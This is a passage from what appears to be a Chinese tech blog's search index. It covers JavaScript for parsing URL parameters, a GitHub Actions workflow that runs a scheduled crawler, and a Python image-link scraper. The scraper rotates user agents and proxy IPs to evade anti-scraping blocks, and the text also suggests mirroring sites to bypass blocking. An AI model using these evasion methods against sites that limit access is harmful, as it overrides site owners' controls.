nbsp;=&amp;nbsp;local2.replace(/\\?{2,}/,&amp;nbsp;&quot;?&quot;);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local3&amp;nbsp;=&amp;nbsp;local2;&amp;nbsp;}&amp;nbsp;//在最后加入一个?,方便截取&amp;nbsp;var&amp;nbsp;local4&amp;nbsp;=&amp;nbsp;local3&amp;nbsp;+&amp;nbsp;&quot;?&quot;;&amp;nbsp;//以?为分割符，循环遍历截取每一个参数并存储在数组中&amp;nbsp;var&amp;nbsp;reg3&amp;nbsp;=&amp;nbsp;/\\?/;&amp;nbsp;var&amp;nbsp;result3&amp;nbsp;=&amp;nbsp;reg3.exec(local4);&amp;nbsp;var&amp;nbsp;arr&amp;nbsp;=&amp;nbsp;[];&amp;nbsp;while&amp;nbsp;(result3&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local5&amp;nbsp;=&amp;nbsp;local4.substring(0,&amp;nbsp;local4.indexOf(&quot;?&quot;));&amp;nbsp;arr.push(local5);&amp;nbsp;local4&amp;nbsp;=&amp;nbsp;local4.substring(local4.indexOf(&quot;?&quot;)&amp;nbsp;+&amp;nbsp;1);&amp;nbsp;result3&amp;nbsp;=&amp;nbsp;reg3.exec(local4);&amp;nbsp;}&amp;nbsp;//删除arr中的空元素&amp;nbsp;var&amp;nbsp;reg4&amp;nbsp;=&amp;nbsp;/^\\s*$/;&amp;nbsp;for&amp;nbsp;(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;arr.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(reg4.exec(arr[i])&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;arr.splice(i,&amp;nbsp;1);&amp;nbsp;i--;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//遍历arr数组，并输出=前面的值与=后面的值&amp;nbsp;for&amp;nbsp;(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;arr.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;reg5&amp;nbsp;=&amp;nbsp;/=/;&amp;nbsp;var&amp;nbsp;result5&amp;nbsp;=&amp;nbsp;reg5.exec(arr[i]);&amp;nbsp;if&amp;nbsp;(result5&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local6&amp;nbsp;=&amp;nbsp;arr[i].substring(0,&amp;nbsp;arr[i].indexOf(&quot;=&quot;));&amp;nbsp;var&amp;nbsp;local7&amp;nbsp;=&amp;nbsp;arr[i].substring(arr[i].indexOf(&quot;=&quot;)&amp;nbsp;+&amp;nbsp;1);&amp;nbsp;alert(&quot;参数&quot;&amp;nbsp;+&amp;nbsp;local6&amp;nbsp;+&amp;nbsp;&quot;的值为&quot;&amp;nbsp;+&amp;nbsp;local7);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有参数&quot;);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;JavaScript&amp;nbsp;//判断有没有&quot;？&quot;&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;1)&amp;nbsp;==&amp;nbsp;&#39;?&#39;)&amp;nbsp;{&amp;nbsp;//如果只有一个参数，那么直接弹出提示框&amp;nbsp;if&amp;nbsp;(local.substring(1).indexOf(&#39;&amp;&#39;)&amp;nbsp;==&amp;nbsp;-1)&amp;nbsp;{&amp;nbsp;alert(local.substring(1));&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//遍历替换所有&amp;为?&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;var&amp;nbsp;reg&amp;nbsp;=&amp;nbsp;/&amp;/g;&amp;nbsp;var&amp;nbsp;result&amp;nbsp;=&amp;nbsp;reg.exec(local);&amp;nbsp;if&amp;nbsp;(result&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;local2&amp;nbsp;=&amp;nbsp;local.replace(reg,&amp;nbsp;&quot;?&quot;);&amp;nbsp;}&amp;nbsp;//删除相邻的?&amp;nbsp;var&amp;nbsp;reg2&amp;nbsp;=&amp;nbsp;/\\?{2,}/;&amp;nbsp;var&amp;nbsp;result2&amp;nbsp;=&amp;nbsp;reg2.exec(local2);&amp;nbsp;if&amp;nbsp;(result2&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local3&amp;nbsp;=&amp;nbsp;local2.replace(/\\?{2,}/,&amp;nbsp;&quot;?&quot;);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local3&amp;nbsp;=&amp;nbsp;local2;&amp;nbsp;//在最后加入一个?,方便截取&amp;nbsp;var&amp;nbsp;local4&amp;nbsp;=&amp;nbsp;local3&amp;nbsp;+&amp;nbsp;&quot;?&quot;;&amp;nbsp;console.log(local4);&amp;nbsp;//以?为分割符，循环遍历截取每一个参数并存储在数组中&amp;nbsp;var&amp;nbsp;reg3&amp;nbsp;=&amp;nbsp;/\\?/;&amp;nbsp;var&amp;nbsp;result3&amp;nbsp;=&amp;nbsp;reg3.exec(local4);&amp;nbsp;var&amp;nbsp;arr&amp;nbsp;=&amp;nbsp;[];&amp;nbsp;while&amp;nbsp;(result3&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local5&amp;nbsp;=&amp;nbsp;local4.substring(0,&amp;nbsp;local4.indexOf(&quot;?&quot;));&amp;nbsp;arr.push(local5);&amp;nbsp;local4&amp;nbsp;=&amp;nbsp;local4.substring(local4.indexOf(&quot;?&quot;)&amp;nbsp;+&amp;nbsp;1);&amp;nbsp;result3&amp;nbsp;=&amp;nbsp;reg3.exec(local4);&amp;nbsp;}&amp;nbsp;//删除arr中的空元素&amp;nbsp;var&amp;nbsp;reg4&amp;nbsp;=&amp;nbsp;/^\\s*$/;&amp;nbsp;for&amp;nbsp;(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;arr.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(reg4.exec(arr[i])&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;arr.splice(i,&amp;nbsp;1);&amp;nbsp;i--;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//遍历arr数组，并输出=前面的值与=后面的值&amp;nbsp;for&amp;nbsp;(var&amp;nbsp;i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;arr.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;reg5&amp;nbsp;=&amp;nbsp;/=/;&amp;nbsp;var&amp;nbsp;result5&amp;nbsp;=&amp;nbsp;reg5.exec(arr[i]);&amp;nbsp;if&amp;nbsp;(result5&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local6&amp;nbsp;=&amp;nbsp;arr[i].substring(0,&amp;nbsp;arr[i].indexOf(&quot;=&quot;));&amp;nbsp;var&amp;nbsp;local7&amp;nbsp;=&amp;nbsp;arr[i].substring(arr[i].indexOf(&quot;=&quot;)&amp;nbsp;+&amp;nbsp;1);&amp;nbsp;alert(&quot;参数&quot;&amp;nbsp;+&amp;nbsp;local6&amp;nbsp;+&amp;nbsp;&quot;的值为&quot;&amp;nbsp;+&amp;nbsp;local7);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有参数&quot;);&amp;nbsp;}&amp;nbsp;&gt;&gt;运行&lt;&lt;&amp;nbsp;页面自动构建&amp;nbsp;当然，自动构建代码需要平台支持，这就不可避免的需要用到服务器。&amp;nbsp;但是在本地无服务器的情况下，也可以上云，比如Github的Actions以及其他类似的服务。&amp;nbsp;下面以Github&amp;nbsp;Actions为例，演示如何使用Github&amp;nbsp;Actions来自动构建页面：&amp;nbsp;Github&amp;nbsp;Actions&amp;nbsp;简而言之，Github&amp;nbsp;Actions就是一个云端的持续集成服务器。想要使用Github，只需要将相应代码传至Github仓库，在其中配置Actions即可。&amp;nbsp;Actions的配置也很简单，只需在仓库内新建.github/workflows/main.yml文件即可。&amp;nbsp;在此yml文件中，可以设置触发方式（如定时、每次提交、每次修改），以及触发条件（如提交的文件、提交的分支）。&amp;nbsp;另外要执行的代码内容，依选择的平台的命令行格式来执行即可。比如要执行一Python脚本，可以在yml文件中写：&amp;nbsp;jobs:&amp;nbsp;build:&amp;nbsp;runs-on:&amp;nbsp;ubuntu-latest&amp;nbsp;#设置运行环境&amp;nbsp;steps:&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;Checkout&amp;nbsp;uses:&amp;nbsp;actions/checkout@v2&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Git&amp;nbsp;set&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;git&amp;nbsp;init&amp;nbsp;git&amp;nbsp;pull&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Set&amp;nbsp;up&amp;nbsp;Python&#39;&amp;nbsp;uses:&amp;nbsp;actions/setup-python@v1&amp;nbsp;with:&amp;nbsp;python-version:&amp;nbsp;3.7&amp;nbsp;#v3&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Install&amp;nbsp;requirements&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;wget&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;bs4&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;urllib3&amp;nbsp;#安装依赖&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Working&#39;&amp;nbsp;run:&amp;nbsp;python&amp;nbsp;update.py&amp;nbsp;#运行主程序&amp;nbsp;其余有关Actions的内容不再赘述，详见Github&amp;nbsp;Actions&amp;nbsp;Docs。&amp;nbsp;使用Github&amp;nbsp;Actions&amp;nbsp;因为Github&amp;nbsp;Actions是一个云端的持续集成服务器，所以可以在Github上配置Actions，然后在Github上提交代码，就可以自动构建页面。&amp;nbsp;但这并不能达到自动构建页面的目的。想要自动部署，目前有两种方式：&amp;nbsp;1.&amp;nbsp;Github&amp;nbsp;Actions&amp;nbsp;+&amp;nbsp;爬虫&amp;nbsp;这个方法能实现全自动的内容抓取、分析、部署。下面以Python为例，讲讲大致的过程：&amp;nbsp;首先需要明确要爬取的内容类型，如图片、文字、视频等。针对这些，如果网站需要展示相应的内容，那么就有使用原内容\\下载至Github后展示两种思路。&amp;nbsp;展示原内容的，即爬虫只爬取资源链接（或文字），然后写入页面；&amp;nbsp;下载至Github，即爬虫爬取链接后下载内容，并使用Git将下载的内容提交至仓库，然后使用GithubPages展示。&amp;nbsp;下载至Github的爬虫&amp;nbsp;前者适合于网站的内容比较简单的，后者适合于网站的内容比较复杂的，并且前者不能存档资源，后者可以存档并备份资源&amp;nbsp;如只是简单的复制内容，如爬取相应网站的css、js、html等并部署到自身以绕过封锁，或者是类似于新闻等的信息展示，那么可以使用第一种方式；&amp;nbsp;如果在网站中需要存档资源方便查询，或者是源网站为非静态导致链接更换频繁，那么可以使用第二种方式。&amp;nbsp;不过两者都有一定的局限性，例如前者不下载资源可能在网站结构改变或者动态站内容更新时，无法自动更新，而后者可能会导致资源冗余等问题。&amp;nbsp;所以最好的方法是两者结合，并以不同资源类型而分情况使用。&amp;nbsp;比如下载图像、文件等资源，并将相应文字资源直接写入html，然后配套修改链接即可。&amp;nbsp;例我的项目为Github:RavelloH/PSGameSpider，其中包含了一个爬虫，用于爬取游戏资源。&amp;nbsp;此项目的Github&amp;nbsp;Actions配置如下：&amp;nbsp;#&amp;nbsp;YAML&amp;nbsp;name:&amp;nbsp;update&amp;nbsp;on:&amp;nbsp;schedule:&amp;nbsp;-&amp;nbsp;cron:&amp;nbsp;&#39;30&amp;nbsp;5/12&amp;nbsp;*&amp;nbsp;*&amp;nbsp;*&#39;&amp;nbsp;#每日更新&amp;nbsp;watch:&amp;nbsp;types:&amp;nbsp;[started]&amp;nbsp;workflow_dispatch:&amp;nbsp;jobs:&amp;nbsp;build:&amp;nbsp;runs-on:&amp;nbsp;ubuntu-latest&amp;nbsp;#运行环境&amp;nbsp;steps:&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;Checkout&amp;nbsp;uses:&amp;nbsp;actions/checkout@v2&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Git&amp;nbsp;set&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;git&amp;nbsp;init&amp;nbsp;git&amp;nbsp;pull&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Set&amp;nbsp;up&amp;nbsp;Python&#39;&amp;nbsp;uses:&amp;nbsp;actions/setup-python@v1&amp;nbsp;with:&amp;nbsp;python-version:&amp;nbsp;3.7&amp;nbsp;#v3&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Install&amp;nbsp;requirements&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;wget&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;bs4&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;urllib3&amp;nbsp;#安装依赖&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Working&#39;&amp;nbsp;run:&amp;nbsp;python&amp;nbsp;update.py&amp;nbsp;#运行主程序&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Page&#39;&amp;nbsp;run:&amp;nbsp;python&amp;nbsp;webpage.py&amp;nbsp;#运行主程序&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;EnglishWorking&#39;&amp;nbsp;run:&amp;nbsp;python&amp;nbsp;en-update.py&amp;nbsp;#运行主程序&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;EnPage&#39;&amp;nbsp;run:&amp;nbsp;python&amp;nbsp;en-webpage.py&amp;nbsp;#运行主程序&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;TOC&amp;nbsp;uses:&amp;nbsp;technote-space/toc-generator@v4&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;Record&amp;nbsp;time&amp;nbsp;run:&amp;nbsp;echo&amp;nbsp;`date`&amp;nbsp;&gt;&amp;nbsp;date.log&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;Commit&amp;nbsp;files&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;git&amp;nbsp;diff&amp;nbsp;git&amp;nbsp;config&amp;nbsp;--local&amp;nbsp;user.email&amp;nbsp;&quot;hyh20060327@qq.com&quot;&amp;nbsp;git&amp;nbsp;config&amp;nbsp;--local&amp;nbsp;user.name&amp;nbsp;&quot;RavelloH&quot;&amp;nbsp;git&amp;nbsp;add&amp;nbsp;-A&amp;nbsp;git&amp;nbsp;commit&amp;nbsp;-m&amp;nbsp;&quot;`date&amp;nbsp;&#39;+%Y-%m-%d&amp;nbsp;%H:%M:%S&#39;`&quot;&amp;nbsp;||&amp;nbsp;exit&amp;nbsp;#动态提交信息&amp;nbsp;git&amp;nbsp;status&amp;nbsp;git&amp;nbsp;push&amp;nbsp;-f&amp;nbsp;env:&amp;nbsp;GITHUB_TOKEN:&amp;nbsp;$\\{\\{&amp;nbsp;secrets.GITHUB_TOKEN&amp;nbsp;\\}\\}&amp;nbsp;上述内容的逻辑是定时\\STAR时激活爬虫，先下载资源，后通过python中的os.listdir()获取本地文件信息，后通过f.write()写入到HTML中。&amp;nbsp;另外，也可以使用另一种方法:&amp;nbsp;爬虫爬取到资源后，前端通过JavaScript将固定命名的资源文件引入，这样也能实现资源的动态更新。&amp;nbsp;不过这对资源形式的要求较高，要求每天只能有固定数（或者换句话说，资源的数目是可预判的）的资源类型。&amp;nbsp;使用这种方法的项目详见EverydayNews&amp;nbsp;前端JS代码实现&amp;nbsp;API&amp;nbsp;+&amp;nbsp;前端即时渲染&amp;nbsp;这部分没什么好说的，看具体API返回的格式就行。&amp;nbsp;返回text的就直接&amp;nbsp;document.write()*外联拖慢加载速度或者.innerHTML()写入即可；&amp;nbsp;返回json的就需要使用JSON.parse()解析，然后再写入即可。（当然要是格式稳定，也可以切分字符串）&amp;nbsp;返回图片的也可以直接img引入即可，但是要注意图片的格式，要是png的话，要加上data:image/png;base64,。&amp;nbsp;这部分最难的是找API，使用起来也很方便，看具体文档就行。&amp;nbsp;","img":["/articles/20220708/show1.gif","/articles/20220708/show2.png","/articles/20220708/code3.png"],"links":["?text=123&?name=aaa#锚点","https://ravelloh.github.io/PSGameSpider/","https://ravelloh.github.io/EverydayNews/","https://github.com/RavelloH/PSGameSpider","?text=123&?name=aaa#实现方法","https://docs.github.com/cn/actions","https://github.com/RavelloH/PSGameSpider","https://github.com/RavelloH/EverydayNews"]},{"name":"Python实现网络爬虫","url":"/articles/20220323/","time":"2022-03-23","class":["技术"],"tag":["python","spider"],"title":["前言","效果","实现方式","代码","下载"],"context":"&amp;nbsp;前言&amp;nbsp;最近在参与一个数据收集的项目，需要大量获取图像及链接等，用人力显然是完成不过来了，&amp;nbsp;于是索性就做个爬虫，一劳永逸了。&amp;nbsp;这里因为项目比较小，对效率要求不大，就选择了使用Python而不是C语言。&amp;nbsp;(也因为Python用起来更省事)&amp;nbsp;本文所含代码可直接跳转#代码查看&amp;nbsp;效果&amp;nbsp;效果如上图，即输入网页链接，自动提取所含图片链接，&amp;nbsp;同时自动转化相对路径为绝对路径，方便下载。&amp;nbsp;最后每行一个print出来，方便统一存储/下载。&amp;nbsp;实现方式&amp;nbsp;Python在爬虫方面已经十分成熟，这里引用第三方库BeautifulSoup与urllib，若无这些库请下载:&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;bs4&amp;nbsp;pip&amp;nbsp;install&amp;nbsp;urllib&amp;nbsp;*命令行执行即可&amp;nbsp;依赖库准备完后，引用：&amp;nbsp;from&amp;nbsp;urllib.request&amp;nbsp;import&amp;nbsp;urlopen,build_opener,ProxyHandler&amp;nbsp;from&amp;nbsp;bs4&amp;nbsp;import&amp;nbsp;BeautifulSoup&amp;nbsp;as&amp;nbsp;bf&amp;nbsp;from&amp;nbsp;urllib&amp;nbsp;import&amp;nbsp;request&amp;nbsp;import&amp;nbsp;random&amp;nbsp;此处引用random以及build_opener与ProxyHandler是为了后续反爬，&amp;nbsp;(毕竟默认UA是Python.Urllib)&amp;nbsp;接着配置UA池与IP代理池，防止被反爬(若项目规模较小可忽略此步)&amp;nbsp;#&amp;nbsp;UA&amp;nbsp;user_agent_list&amp;nbsp;=&amp;nbsp;[&amp;nbsp;&quot;Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)&quot;,&amp;nbsp;&quot;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&quot;,&amp;nbsp;&quot;Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;SE2.XMetaSr1.0;SE2.XMetaSr1.0;.NETCLR2.0.50727;SE2.XMetaSr1.0)&quot;&amp;nbsp;]&amp;nbsp;#&amp;nbsp;随机UA&amp;nbsp;headers&amp;nbsp;={&amp;nbsp;&#39;User-Agent&#39;:random.choice(user_agent_list)&amp;nbsp;##&amp;nbsp;随机抽取UA&amp;nbsp;}&amp;nbsp;ip_list=[&amp;nbsp;&#39;125.120.62.26&#39;,&amp;nbsp;##IP池&amp;nbsp;&#39;66.249.93.118&#39;&amp;nbsp;]&amp;nbsp;#&amp;nbsp;IP&amp;nbsp;ip={&amp;nbsp;&#39;http&#39;:random.choice(ip_list)&amp;nbsp;##随机抽取IP&amp;nbsp;}&amp;nbsp;link&amp;nbsp;=&amp;nbsp;input(&quot;在此输入网址:http://&quot;)&amp;nbsp;htmlurl&amp;nbsp;=&amp;nbsp;&quot;https://&quot;+str(link)&amp;nbsp;#链接整合，若input中输入了带http头的链接可忽略此行&amp;nbsp;req&amp;nbsp;=&amp;nbsp;request.Request(htmlurl,headers=headers)&amp;nbsp;#请求整合&amp;nbsp;其中，ip_list推荐使用Github@jhao104/proxy_pool开源的IP代理池。*代码中所列IP均为演示作用，若需应用请自行设置&amp;nbsp;在此就完成了UA与IP的随机分配，反爬基本完成&amp;nbsp;不过反爬归反爬，也请自觉遵守robot协议，合理利用爬虫&amp;nbsp;下一步，发出请求：&amp;nbsp;#&amp;nbsp;用ProxyHandler创建代理ip对象&amp;nbsp;pro_han&amp;nbsp;=&amp;nbsp;ProxyHandler(ip)&amp;nbsp;#&amp;nbsp;使用build_opener替代urlopen()创建一个对象&amp;nbsp;opener&amp;nbsp;=&amp;nbsp;build_opener(pro_han)&amp;nbsp;#&amp;nbsp;发送请求&amp;nbsp;res&amp;nbsp;=&amp;nbsp;opener.open(req)&amp;nbsp;到这里为止，整个请求结束，之后用BeautifulSoup解析:&amp;nbsp;*下面已用bs代指beautifulsoup&amp;nbsp;obj&amp;nbsp;=&amp;nbsp;bf(res.read(),&#39;html.parser&#39;)&amp;nbsp;#解析html&amp;nbsp;title&amp;nbsp;=&amp;nbsp;str(obj.head.title)&amp;nbsp;#获取标题&amp;nbsp;print(&quot;站点标题:&quot;,title,&quot;正在查找图片&quot;)&amp;nbsp;pic_info&amp;nbsp;=&amp;nbsp;obj.find_all(&#39;img&#39;)&amp;nbsp;#查询img标签&amp;nbsp;这里也给出不含反爬的请求：&amp;nbsp;(基本同上，唯一的区别是直接用urlopen打开链接)&amp;nbsp;html&amp;nbsp;=&amp;nbsp;urlopen(&quot;https://&quot;+link)&amp;nbsp;obj&amp;nbsp;=&amp;nbsp;bs(html.read(),&#39;html.parser&#39;)&amp;nbsp;#解析html&amp;nbsp;title&amp;nbsp;=&amp;nbsp;str(obj.head.title)&amp;nbsp;#获取标题&amp;nbsp;print(&quot;站点标题:&quot;,title,&quot;正在查找图片&quot;)&amp;nbsp;pic_info&amp;nbsp;=&amp;nbsp;obj.find_all(&#39;img&#39;)&amp;nbsp;#查询img标签&amp;nbsp;到这里我们已经成功将网页中所含的所有img标签以列表形式存储在了变量pic_info中，&amp;nbsp;接下来遍历输出即可：&amp;nbsp;j&amp;nbsp;=&amp;nbsp;0&amp;nbsp;#配置遍历&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;pic_info:&amp;nbsp;j&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;pic&amp;nbsp;=&amp;nbsp;str(i[&#39;src&#39;])&amp;nbsp;#转为字符串，方便查询&amp;nbsp;if&amp;nbsp;&quot;http&quot;&amp;nbsp;not&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;#检测http头&amp;nbsp;if&amp;nbsp;&quot;data&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;#检测是否为DataURIScheme&amp;nbsp;continue&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;&quot;//&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;#格式补全&amp;nbsp;print(&quot;http:&quot;+pic)&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;pic[0]&amp;nbsp;==&amp;nbsp;&quot;/&quot;:&amp;nbsp;#适配相对路径&amp;nbsp;print(&quot;http://&quot;+link+pic)&amp;nbsp;else:&amp;nbsp;print(&quot;http://&quot;+link+&quot;/&quot;+pic)&amp;nbsp;else:&amp;nbsp;print(pic)&amp;nbsp;#直接print绝对路径&amp;nbsp;上图套了四个if-else，作用分别是检测是否有http头、是否为内嵌base64图片、是否以//简写路径、是否使用相对路径，&amp;nbsp;到这里为止，整个程序就结束了&amp;nbsp;整个示例程序可分为引用-配置-请求-分析-输出5个部分，&amp;nbsp;除了爬取图片，也可将上面的pic_info&amp;nbsp;=&amp;nbsp;obj.find_all(&#39;img&#39;)改成其他标签，&amp;nbsp;比如改成meta可爬取简介，也可在特定站点内通过zaifind_all内添加对应的class(class_=&quot;xxx&quot;)及id(id_=&quot;xxx&quot;)来获取对应标签内的信息，&amp;nbsp;实现更多功能。&amp;nbsp;代码&amp;nbsp;完整版&amp;nbsp;from&amp;nbsp;urllib.request&amp;nbsp;import&amp;nbsp;urlopen,build_opener,ProxyHandler&amp;nbsp;from&amp;nbsp;bs4&amp;nbsp;import&amp;nbsp;BeautifulSoup&amp;nbsp;as&amp;nbsp;bf&amp;nbsp;from&amp;nbsp;urllib&amp;nbsp;import&amp;nbsp;request&amp;nbsp;import&amp;nbsp;random&amp;nbsp;#&amp;nbsp;UA&amp;nbsp;user_agent_list&amp;nbsp;=&amp;nbsp;[&amp;nbsp;&quot;Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)&quot;,&amp;nbsp;&quot;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&quot;,&amp;nbsp;&quot;Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)&quot;,&amp;nbsp;&quot;Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;SE2.XMetaSr1.0;SE2.XMetaSr1.0;.NETCLR2.0.50727;SE2.XMetaSr1.0)&quot;&amp;nbsp;]&amp;nbsp;#&amp;nbsp;随机UA&amp;nbsp;headers&amp;nbsp;={&amp;nbsp;&#39;User-Agent&#39;:random.choice(user_agent_list)&amp;nbsp;}&amp;nbsp;ip_list=[&amp;nbsp;&#39;209.97.171.128&#39;,&amp;nbsp;&#39;114.250.25.19&#39;,&amp;nbsp;&#39;125.120.62.26&#39;,&amp;nbsp;&#39;66.249.93.118&#39;,&amp;nbsp;&#39;1.202.113.240&#39;,&amp;nbsp;]&amp;nbsp;#&amp;nbsp;IP&amp;nbsp;ip={&amp;nbsp;&#39;http&#39;:random.choice(ip_list)&amp;nbsp;}&amp;nbsp;link&amp;nbsp;=&amp;nbsp;input(&quot;在此输入网址:http://&quot;)&amp;nbsp;htmlurl&amp;nbsp;=&amp;nbsp;&quot;https://&quot;+str(link)&amp;nbsp;req&amp;nbsp;=&amp;nbsp;request.Request(htmlurl,headers=headers)&amp;nbsp;#&amp;nbsp;创建代理ip对象&amp;nbsp;pro_han&amp;nbsp;=&amp;nbsp;ProxyHandler(ip)&amp;nbsp;#&amp;nbsp;使用build_opener创建一个对象&amp;nbsp;opener&amp;nbsp;=&amp;nbsp;build_opener(pro_han)&amp;nbsp;#&amp;nbsp;发送请求&amp;nbsp;res&amp;nbsp;=&amp;nbsp;opener.open(req)&amp;nbsp;obj&amp;nbsp;=&amp;nbsp;bf(res.read(),&#39;html.parser&#39;)&amp;nbsp;#解析html&amp;nbsp;title&amp;nbsp;=&amp;nbsp;str(obj.head.title)&amp;nbsp;print(&quot;站点标题:&quot;,title,&quot;正在查找图片&quot;)&amp;nbsp;pic_info&amp;nbsp;=&amp;nbsp;obj.find_all(&#39;img&#39;)&amp;nbsp;j&amp;nbsp;=&amp;nbsp;0&amp;nbsp;#配置遍历&amp;nbsp;for&amp;nbsp;i&amp;nbsp;in&amp;nbsp;pic_info:&amp;nbsp;j&amp;nbsp;+=&amp;nbsp;1&amp;nbsp;pic&amp;nbsp;=&amp;nbsp;str(i[&#39;src&#39;])&amp;nbsp;if&amp;nbsp;&quot;http&quot;&amp;nbsp;not&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;if&amp;nbsp;&quot;data&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;continue&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;&quot;//&quot;&amp;nbsp;in&amp;nbsp;pic:&amp;nbsp;print(&quot;http:&quot;+pic)&amp;nbsp;else:&amp;nbsp;if&amp;nbsp;pic[0]&amp;nbsp;==&amp;nbsp;&quot;/&quot;:&amp;nbsp;print(&quot;http://&quot;+link+pic)&amp;nbsp;else:&amp;nbsp;print(&quot;http://&quot;+link+&quot;/&quot;+pic)&amp;nbsp;else:&amp;nbsp;print(pic)&amp;nbsp;基础版&amp;nbsp;from&amp;nbsp;urllib.request&amp;nbsp;import&amp;nbsp;urlopen&amp;nbsp;from&amp;nbsp;bs4&amp;nbsp;import&amp;nbsp;BeautifulSoup&amp;nbsp;as&amp;nbsp;bs&amp;nbsp;link&amp;nbsp;=&amp;nbsp;input(&quot;在此输入网址:http://&quot;)&amp;nbsp;html&amp;nbsp;=&amp;nbsp;urlopen(&quot;https://&quot;+link)&amp;nbsp;obj&amp;nbsp;=&amp;nbsp;bs(html.read(),&#39;html.parser&#39;)&amp;nbsp;#解析html&amp;nbsp;title&amp;nbsp;=&amp;nbsp;str(obj.head.title)&amp;nbsp;print(&quot;站点标题:&quot;,title,&quot;